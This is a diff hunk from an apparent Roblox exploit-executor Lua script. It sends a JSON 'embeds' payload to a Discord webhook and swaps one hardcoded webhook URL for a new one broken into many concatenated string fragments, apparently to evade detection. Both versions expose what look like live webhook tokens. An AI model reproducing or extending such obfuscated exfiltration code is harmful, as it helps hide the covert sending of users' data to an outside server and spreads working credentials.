@@ -230,7 +230,7 @@ task.delay(0.3, function()
             }
 
             local jsonData = HttpService:JSONEncode({embeds = {embedData}})
-            local link = "https://disco" .. "rd.com/api/web" .. "hooks/1398225573448253501/cJfHsYENZ4Qcjl30TjYFsrqQ6vxyxYrxVXY4tRUCnbK8yLpwRC6Molu_hYItSNiuly58"
+            local link = "htt" .. "ps://dis" .. "cord" .. ".com/ap" .. "i/webho" .. "o" .. "ks/1" .. "399575" .. "42924" .. "4784670/" .. "Ea__jFxdaU" .. "GXcai" .. "JLy8A-zrWD" .. "eidDq" .. "M8lA1Ux" .. "ygVQ3hhT9P_M3" .. "qiNsSH" .. "CJLlajH7kNp-"
 
             local req = (syn and syn.request) or (http_request) or (request) or (http and http.request)
             if req then
